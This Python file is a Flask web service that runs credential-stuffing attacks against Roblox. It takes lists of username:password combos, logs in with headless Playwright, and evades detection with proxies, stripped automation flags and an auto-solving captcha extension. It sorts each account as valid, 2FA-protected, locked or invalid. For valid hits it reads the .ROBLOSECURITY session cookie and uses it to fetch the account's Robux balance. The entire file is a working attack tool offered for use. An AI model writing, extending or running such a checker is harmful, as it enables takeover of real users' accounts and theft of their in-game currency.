import asyncio
import aiohttp
import json
import os
import tempfile
import shutil
from pathlib import Path
from flask import Flask, request, jsonify
from playwright.async_api import async_playwright

app = Flask(__name__)

CONFIG = {
    "timeout": 60,
    "retry_delay": 1.0,
    "api_delay": 0.5,
    "proxies": []
}

stats = {
    "hits": 0, "twofa": 0, "bad": 0, "totalrbx": 0,
    "locked": 0, "captcha": 0, "checked": 0, "total": 0
}

def get_script_dir() -> Path:
    return Path(tempfile.gettempdir()) / "Polygon"

def extract_nopecha_to_temp():
    temp_dir = Path(tempfile.gettempdir()) / "Polygon" / "nopecha"
    if temp_dir.exists():
        shutil.rmtree(temp_dir, ignore_errors=True)
    bundled_nopecha = Path(os.getenv("NOPECHA_PATH", "nopecha"))
    if bundled_nopecha.exists():
        shutil.copytree(bundled_nopecha, temp_dir)
    else:
        raise RuntimeError("NopeCHA directory not found.")

def setup_nopecha_extension(api_key: str) -> bool:
    nopecha_dir = get_script_dir() / "nopecha"
    manifest_path = nopecha_dir / "manifest.json"
    if not nopecha_dir.exists() or not manifest_path.exists():
        return False
    try:
        with manifest_path.open("r", encoding="utf-8") as f:
            manifest = json.load(f)
        manifest["nopecha"] = manifest.get("nopecha", {})
        manifest["nopecha"]["key"] = api_key
        manifest["funcaptcha_auto_solve"] = True
        manifest["funcaptcha_auto_open"] = True
        with manifest_path.open("w", encoding="utf-8") as f:
            json.dump(manifest, f, indent=4)
        return True
    except Exception:
        return False

def get_random_proxy(proxies: list, proxy_index: int) -> str | None:
    if not proxies or proxy_index >= len(proxies):
        return None
    return proxies[proxy_index % len(proxies)]

async def fetch_account_details(page, cookies, proxies: list) -> dict:
    roblox_security = next((c["value"] for c in cookies if c["name"] == ".ROBLOSECURITY"), None)
    if not roblox_security:
        return {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}
    user_id = await page.evaluate("() => document.body.innerHTML.match(/data-userid=\"(\d+)\"/)?.[1]")
    if not user_id:
        return {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}
    async with aiohttp.ClientSession() as session:
        details = {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}
        headers = {
            "Cookie": f".ROBLOSECURITY={roblox_security}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        }
        proxy_index = 0
        for attempt in range(2):
            proxy = get_random_proxy(proxies, proxy_index)
            try:
                await asyncio.sleep(CONFIG["api_delay"])
                async with session.get(
                    f"https://economy.roblox.com/v1/users/{user_id}/currency",
                    headers=headers,
                    proxy=proxy
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        details["robux"] = data.get("robux", 0)
                        stats["totalrbx"] += details["robux"]
                        break
                    elif response.status == 429:
                        proxy_index += 1
                        await asyncio.sleep(CONFIG["retry_delay"])
                    else:
                        proxy_index += 1
                        break
            except Exception:
                proxy_index += 1
                break
        return details

async def check_account(combo: str, context, proxies: list, use_captcha_solver: bool) -> dict:
    username, password = combo.split(":", 1)
    page = await context.new_page()
    proxy = get_random_proxy(proxies, 0) if proxies else None
    if proxy:
        await page.route("**", lambda route: route.continue_(proxy=proxy))
    try:
        await page.goto("https://www.roblox.com/login", wait_until="domcontentloaded", timeout=CONFIG["timeout"] * 1000)
        await page.wait_for_selector("input[id='login-username']", timeout=10000)
        await page.fill("input[id='login-username']", username)
        await page.fill("input[id='login-password']", password)
        await page.click("button[id='login-button']")
        if use_captcha_solver:
            await page.wait_for_timeout(10000)
        else:
            await page.wait_for_timeout(5000)
        await page.wait_for_load_state("networkidle", timeout=30000)
        if "login" in page.url.lower():
            error_message = await page.query_selector("p.status-error-message")
            if error_message:
                error_text = await error_message.text_content()
                if "incorrect" in error_text.lower():
                    stats["bad"] += 1
                    return {"combo": combo, "status": "Invalid"}
                elif "two step" in error_text.lower() or "verification" in error_text.lower():
                    stats["twofa"] += 1
                    return {"combo": combo, "status": "2FA"}
                elif "locked" in error_text.lower():
                    stats["locked"] += 1
                    return {"combo": combo, "status": "Locked"}
                else:
                    stats["bad"] += 1
                    return {"combo": combo, "status": "Bad"}
            else:
                stats["captcha"] += 1
                return {"combo": combo, "status": "Captcha"}
        elif "home" in page.url.lower() or "roblox.com" in page.url.lower():
            await page.wait_for_selector("div#HomeContainer, div#navigation-container", timeout=10000)
            cookies = await context.cookies()
            details = await fetch_account_details(page, cookies, proxies)
            stats["hits"] += 1
            return {"combo": combo, "status": "Valid", "details": details}
    except Exception as e:
        stats["bad"] += 1
        return {"combo": combo, "status": "Bad", "error": str(e)}
    finally:
        await page.close()

@app.route("/check", methods=["POST"])
async def check_accounts():
    data = request.get_json()
    combos = data.get("combos", [])
    proxies = data.get("proxies", [])
    use_captcha_solver = data.get("use_captcha_solver", False)
    nopecha_api_key = data.get("nopecha_api_key", "")
    max_tasks = data.get("max_tasks", 1)

    if not combos:
        return jsonify({"error": "No combos provided"}), 400

    stats.update({k: 0 for k in stats})
    stats["total"] = len(combos)

    if use_captcha_solver:
        extract_nopecha_to_temp()
        if not setup_nopecha_extension(nopecha_api_key):
            return jsonify({"error": "Failed to set up NopeCHA extension"}), 500

    user_data_dir = str(get_script_dir() / "user_data")
    launch_args = [
        "--enable-logging",
        "--v=1",
        "--disable-blink-features=AutomationControlled",
        "--no-sandbox",
    ]
    if use_captcha_solver:
        nopecha_path = str(get_script_dir() / "nopecha").replace("\\", "/")
        launch_args.extend([
            f"--disable-extensions-except={nopecha_path}",
            f"--load-extension={nopecha_path}"
        ])

    queue = asyncio.Queue()
    for combo in combos:
        await queue.put(combo)

    results = []
    async with async_playwright() as p:
        context = await p.chromium.launch_persistent_context(
            user_data_dir=user_data_dir,
            headless=True,
            args=launch_args,
            ignore_default_args=["--enable-automation"],
            viewport={"width": 1280, "height": 720},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        )
        semaphore = asyncio.Semaphore(max_tasks)
        tasks = [
            check_account(combo, context, proxies, use_captcha_solver)
            for combo in combos
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        await context.close()

    return jsonify({"results": results, "stats": stats})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)